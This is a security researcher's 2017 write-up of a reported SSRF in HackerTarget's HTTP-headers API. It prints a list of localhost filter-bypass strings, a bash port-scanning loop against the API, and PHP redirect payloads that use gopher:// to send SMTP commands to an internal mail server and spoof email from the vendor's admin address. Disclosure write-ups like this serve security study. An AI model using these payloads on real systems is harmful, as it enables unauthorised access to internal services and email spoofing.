# Hacking the Hackers: Leveraging an SSRF in HackerTarget

AuthorCORBEN LEO

Published2017.12.17

### Introduction:

This is a write-up of an SSRF I accidentally found in HackerTarget and leveraged to get access to internal services! Please **note** that they **don't** have an active bug bounty program.

#### What is HackerTarget?

[HackerTarget](https://hackertarget.com) is a service that provides access to online vulnerability scanners and tools used by many security professionals and "makes securing your systems easier". They also are the creators of [DNSDumpster](https://dnsdumpster.com/), which is utilized in several recon tools.

#### SSRF:

Server-Side Request Forgery (SSRF) is a vulnerability in which an attacker can send a controlled, crafted request via a vulnerable application. We can communicate with different services running on different protocols by utilizing URI schemes such as `gopher://`,`dict://`, `ftp://`, etc. Getting a server to issue a request **is not** a vulnerability in itself, but it becomes one when you can make requests to things you wouldn’t or shouldn’t normally have access to, such as internal networks or internal services.

### Finding the vulnerability:

I was using DNSDumpster for recon during a bug hunting session, and I noticed there was a button of a globe similar to 🌎 that said "Get HTTP Headers":

![HT-HTTPHeaders](/static/images/Blog/hackertarget/ht-httpheaders.png)

It made a call to `https://api.hackertarget.com/httpheaders/?q=<target>` and displayed the HTTP Headers of a simple **GET** request sent to the target server.

![HT-API-Call](/static/images/Blog/hackertarget/api-result.png)

I was obviously intrigued, so I tried querying 127.0.0.1! The API dumped the HTTP request and the query went through! I then tried to see if I could get the SSH version by querying **127.0.0.1:22**

Response: ![HT-SSH](/static/images/Blog/hackertarget/ht-ssh.png)

I initially reported it as is, knowing I could hit internal services if there were any. They thanked me for the heads up and told me to check the patch they issued. I checked it, and it was easy to bypass: it was merely blocking 127.0.0.1. Here are a few of the bypasses I used:
  
  
  0
  127.00.1
  127.0.01
  0.00.0
  0.0.00
  127.1.0.1
  127.10.1
  127.1.01
  0177.1
  0177.0001.0001
  0x0.0x0.0x0.0x0
  0000.0000.0000.0000
  0x7f.0x0.0x0.0x1
  0177.0000.0000.0001
  0177.0001.0000..0001
  0x7f.0x1.0x0.0x1
  0x7f.0x1.0x1
  localtest.me

I informed them that there **isn't** a way to validate the query just by using string-based checks, so I suggested that they **resolve** the domains and **check** them against local IP ranges. They agreed and said they would think about it.

About 10 days later I asked if they had issued another patch or not, and the response was:

> "It is on my todo list. Not critical though as there are no local services that could be hit with it."

#### challenge accepted.

### Leveraging:

I decided to write a bash script that queried the API with one of the bypasses and with a port number to see if I could see what internal services it was running:
  
  
  #!/usr/bin/env bash
  for port in `seq 1 9999`
  do
  echo -e "\n\n[+] Checking Port: "$port"\n"
  curl 'https://api.hackertarget.com/httpheaders/?q=http://'$1':'$port && echo -e "\n"
  done

I ran it: `root@pwn ~ ./ht 0177.1`

HackerTarget limits 25 API queries per IP, so my script only showed the ports 1 - 25. The only responses I got were from SSH running on port 22 and I luckily got a response from the SMTP server on port 25, which I had totally overlooked before!

![HT-POSTFIX](/static/images/Blog/hackertarget/ht-postfix.png)

#### SMTP?

  * SMTP stands for Simple Mail Transfer Protocol.
  * It is a [TCP/IP](https://en.wikipedia.org/wiki/Internet_protocol_suite) protocol that's used for sending emails. (who would've guessed?)
  * Usually it's used along with either [pop3](https://en.wikipedia.org/wiki/Post_Office_Protocol) or [IMAP](https://en.wikipedia.org/wiki/Internet_Message_Access_Protocol), which are used to receive emails.

I knew I would be able to hit the service with this SSRF, but I wasn't positive that I would be able to send the valid commands needed to send emails from it. I then tried deducing which wrappers were supported and enabled besides **http://** and **https://**. I tried using dict:// right away and was able to get the libcurl version, but that wasn't very helpful. Next, I created a PHP file on my server to initiate a redirect to another port with the gopher:// wrapper:
  
  
  <?php
  header("Location: gopher://<server>:1337/_SSRF%0ATest!");
  ?>

In a nutshell, the gopher:// protocol sends 1 character, a new line (CR+LF), and the remaining data, which allows us to send a **multiline request**. I started netcat and checked the API again: `https://api.hackertarget.com/httpheaders/?q=http://<server>/redirect.php`. It followed the redirect and I received a multiline request on port 1337! This means I could send valid commands to the internal SMTP server!

### The Finale

I created another PHP file on my server that would redirect the API to the internal SMTP server and issue the valid SMTP commands!
  
  
  <?php
  $commands = array(
  'HELO hackertarget.com',
  'MAIL FROM: <admin@hackertarget.com>',
  'RCPT To: <my@email.com>',
  'DATA',
  'Subject: cdl!',
  'Corben was here, woot woot!',
  '.'
  );
  
  $payload = implode('%0A', $commands);
  
  header('Location: gopher://0:25/_'.$payload);
  ?>

I changed the query one last time: `https://api.hackertarget.com/httpheaders/?q=http://<server>/smtp.php`

I went to my email, reloaded it once.

A new email popped up from "[admin@hackertarget.com](mailto:admin@hackertarget.com)" with the subject "cdl!" and the message was "Corben was here, woot woot!"

After yelling 'heck yeah!', I created a quick proof-of-concept video and I sent it over to HackerTarget. Here's the video:

The response?

> Nice work. Thanks for the PoC. I will finish mitigation on this and check other inputs too now.... you have opened my eyes to SSRF :)

It was a blast to leverage an SSRF on a target that everyone knows of and uses often!

### Note:

They **DO NOT** have a bug bounty program, so please **DO NOT** test them without their permission!

Thanks for reading,

**Corben Leo**
